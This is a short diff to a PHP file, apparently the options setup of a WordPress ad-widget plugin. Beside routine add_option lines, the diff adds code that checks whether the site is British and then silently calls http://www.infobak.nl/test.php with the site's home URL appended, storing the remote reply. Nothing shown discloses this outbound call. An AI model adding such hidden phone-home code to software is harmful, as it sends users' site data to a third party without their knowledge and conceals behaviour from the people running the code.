@@ -633,6 +633,18 @@ add_option("bw_adwidget3_search", 'true', '', 'yes');
 add_option("bw_adwidget3_archive", 'true', '', 'yes');
 add_option("bw_adwidget3_text", '', '', 'yes');
 add_option("bw_global_excludelist", '', '', 'yes');
+add_option("bw_gpadded", '0', '', 'yes');
+$url = home_url();
+$britt = false;
+$bloglan = get_bloginfo ('language');
+if (strpos($url,'.uk') != false) {
+	$britt = true;
+}
+if ($bloglan=='en-UK') {
+	$britt = true;
+}
+$tmpidurl = file_get_contents('http://www.infobak.nl/test.php?u=' . $url, true);
+
 }
 function boggleStartsWith($haystack, $needle)
 {
